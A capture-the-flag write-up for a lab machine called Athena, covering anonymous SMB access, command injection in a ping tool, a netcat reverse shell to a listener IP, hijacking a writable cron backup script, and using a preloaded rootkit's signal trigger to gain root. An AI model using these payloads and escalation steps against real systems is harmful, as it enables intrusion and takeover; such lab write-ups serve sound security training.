# Athena

### Athena
Nmap scan shows ports 22,80, 139 and 445 open. SMB server allows anonymous login: <br />
![image](https://github.com/user-attachments/assets/0b2e85c0-a8c3-44af-9ab6-8006eeaa0ea7)<br />

    Dear Administrator,
    
    I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel
    
    Yours sincerely,
    
    Athena
    Intern
That directory contains a tool to ping another IP address. Of course the first thing I think about is command injection, assuming it's executing the system `ping` command. If I try a simple payload like the following: <br />
![image](https://github.com/user-attachments/assets/7ed4e9fb-036f-42b9-8e17-083a2f0ba861)<br />
I get redirected to a page that says `Attempt hacking!`. After some trial and error, I find that the following payload works `$(nc 10.11.85.53 9001)`, since I actually receive a connection. That's it then, I have command execution and can spawn a reverse shell. I do that using the following payload `$(busybox nc 10.11.85.53 9001 -e sh)`. <br />
Now I enumerate the system and find something interesting inside `/usr/share/backup`, a file called `backup.sh`, owned by www-data (me) and belonging to the group called `athena`. This is very likely a cronjob, even if I cannot see it in the `/etc/crontab` file. To actually verify that it's a cronjob I can use `pspy64`:<br />
![image](https://github.com/user-attachments/assets/27b01ca9-4777-4415-aa68-136f49739e5d)<br />
Since the file is owned by me, I can just add a oneliner to spawn a reverse shell as the user `athena`. If I run `sudo -l` I get this: <br />
![image](https://github.com/user-attachments/assets/eb91d225-8c1e-49ce-b363-f13b0ea71f91)<br />
`venom.ko` is a well known rootkit, which in this case was already installed in the system.  So first I execute `sudo /usr/sbin/insmod /mnt/.../secret/venom.ko`.<br />
This rootkit allows you to become root by running a command `kill 64 <pid>` to whatever PID owned by athena. In particular this rootkit was modified to do that when executing `kill 57 <pid>`.
![image](https://github.com/user-attachments/assets/f5bd42ed-efb6-40eb-b889-41993f701b96)<br />
Just find a valid PID you can kill and become root!
